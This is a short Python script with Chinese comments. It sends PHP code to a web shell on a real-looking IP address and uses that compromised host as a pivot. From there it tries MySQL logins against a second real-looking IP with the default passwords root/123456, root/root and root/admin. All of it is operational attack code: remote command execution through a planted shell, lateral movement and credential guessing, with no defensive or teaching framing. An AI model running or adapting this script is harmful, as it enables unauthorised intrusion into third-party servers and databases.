#!/usr/bin/env python3
"""从81.70跳板连124.71的MySQL 3306 (root/123456)"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=40):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:80]}"

# PHP mysqli 连 124.71:3306
code = '''
$c=@mysqli_connect('124.71.142.158', 'root', '123456', '', 3306);
if(!$c){print_r('FAIL:' . mysqli_connect_error());}else{print_r('CONN_OK ver:' . mysqli_get_server_info($c));mysqli_close($c);}
'''
r = cmd(code, 40)
print("1. root/123456:", r.strip()[-100:], flush=True)

code2 = '''
$c=@mysqli_connect('124.71.142.158', 'root', 'root', '', 3306);
if(!$c){print_r('FAIL:' . mysqli_connect_error());}else{print_r('CONN_OK root/root');mysqli_close($c);}
'''
r = cmd(code2, 40)
print("2. root/root:", r.strip()[-100:], flush=True)

code3 = '''
$c=@mysqli_connect('124.71.142.158', 'root', 'admin', '', 3306);
if(!$c){print_r('FAIL:' . mysqli_connect_error());}else{print_r('CONN_OK admin');mysqli_close($c);}
'''
r = cmd(code3, 40)
print("3. root/admin:", r.strip()[-100:], flush=True)
